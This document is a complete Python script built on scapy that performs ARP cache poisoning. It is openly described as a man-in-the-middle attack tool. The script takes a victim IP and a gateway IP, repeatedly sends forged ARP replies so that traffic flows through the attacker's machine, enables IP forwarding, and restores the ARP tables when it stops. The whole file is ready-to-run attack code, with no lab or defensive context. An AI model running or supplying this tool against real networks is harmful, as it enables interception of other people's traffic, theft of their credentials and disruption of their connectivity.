#!/usr/bin/env python3
"""
ARP Spoofer - Man-in-the-Middle attack via ARP cache poisoning
Melakukan ARP poisoning untuk MITM attack.
Usage: sudo python arp_spoofer.py -t 192.168.1.5 -g 192.168.1.1
"""

import argparse
import sys
import os
import time
import threading


def check_root():
    if os.name == "posix" and os.geteuid() != 0:
        print("[!] ARP spoofing requires root privileges")
        return False
    return True


def get_mac(ip):
    """Get MAC address of IP via ARP"""
    try:
        from scapy.all import getmacbyip, ARP, Ether, srp

        mac = getmacbyip(ip)
        if mac:
            return mac
        # Try ARP request
        arp = ARP(pdst=ip)
        ether = Ether(dst="ff:ff:ff:ff:ff:ff")
        packet = ether / arp
        result = srp(packet, timeout=2, verbose=False)[0]
        for _, received in result:
            return received.hwsrc
    except Exception as e:
        print(f"[!] Error getting MAC for {ip}: {e}")
    return None


def arp_spoof(target_ip, host_ip, target_mac, host_mac, interface, restore=False):
    """Send ARP packet to poison target's cache"""
    from scapy.all import ARP, Ether, sendp

    if restore:
        # Restore legitimate ARP
        packet = Ether(dst=target_mac) / ARP(
            op=2,
            pdst=target_ip,
            hwdst=target_mac,
            psrc=host_ip,
            hwsrc=host_mac,
        )
    else:
        # Tell target that we are the host
        packet = Ether(dst=target_mac) / ARP(
            op=2,
            pdst=target_ip,
            hwdst=target_mac,
            psrc=host_ip,
            hwsrc=get_if_mac(interface),
        )
    sendp(packet, iface=interface, verbose=False)


def get_if_mac(interface):
    try:
        from scapy.all import get_if_hwaddr

        return get_if_hwaddr(interface)
    except:
        return "00:00:00:00:00:00"


def spoof_loop(target_ip, gateway_ip, target_mac, gateway_mac, interface, interval):
    """Continuous ARP spoofing loop"""
    try:
        sent_packets = 0
        while True:
            arp_spoof(target_ip, gateway_ip, target_mac, get_if_mac(interface), interface)
            arp_spoof(gateway_ip, target_ip, gateway_mac, get_if_mac(interface), interface)
            sent_packets += 2
            print(f"\r[+] ARP packets sent: {sent_packets}", end="", flush=True)
            time.sleep(interval)
    except KeyboardInterrupt:
        print("\n[*] Restoring ARP tables...")
        # Send 5 restore packets
        for _ in range(5):
            arp_spoof(target_ip, gateway_ip, target_mac, gateway_mac, interface, restore=True)
            arp_spoof(gateway_ip, target_ip, gateway_mac, target_mac, interface, restore=True)
            time.sleep(1)
        print("[+] ARP tables restored")


def enable_ip_forward():
    """Enable IP forwarding for MITM"""
    if os.name == "posix":
        try:
            with open("/proc/sys/net/ipv4/ip_forward", "w") as f:
                f.write("1\n")
            print("[+] IP forwarding enabled")
            return True
        except Exception as e:
            print(f"[!] Failed to enable IP forwarding: {e}")
            return False
    return False


def main():
    parser = argparse.ArgumentParser(description="ARP Spoofer for MITM")
    parser.add_argument("-t", "--target", required=True, help="Target IP (victim)")
    parser.add_argument("-g", "--gateway", required=True, help="Gateway IP")
    parser.add_argument("-i", "--interface", required=True, help="Network interface")
    parser.add_argument("--interval", type=float, default=2, help="Send interval (seconds)")
    parser.add_argument("--no-forward", action="store_true", help="Don't enable IP forwarding")
    args = parser.parse_args()

    if not check_root():
        sys.exit(1)

    print(f"[*] Target: {args.target}")
    print(f"[*] Gateway: {args.gateway}")
    print(f"[*] Interface: {args.interface}")

    target_mac = get_mac(args.target)
    gateway_mac = get_mac(args.gateway)

    if not target_mac:
        print(f"[!] Could not get MAC for target {args.target}")
        sys.exit(1)
    if not gateway_mac:
        print(f"[!] Could not get MAC for gateway {args.gateway}")
        sys.exit(1)

    print(f"[+] Target MAC: {target_mac}")
    print(f"[+] Gateway MAC: {gateway_mac}")

    if not args.no_forward:
        if not enable_ip_forward():
            print("[!] WARNING: IP forwarding not enabled - target will lose connectivity")

    print("[*] Starting ARP spoofing... (Ctrl+C to stop)")
    spoof_loop(args.target, args.gateway, target_mac, gateway_mac, args.interface, args.interval)


if __name__ == "__main__":
    main()
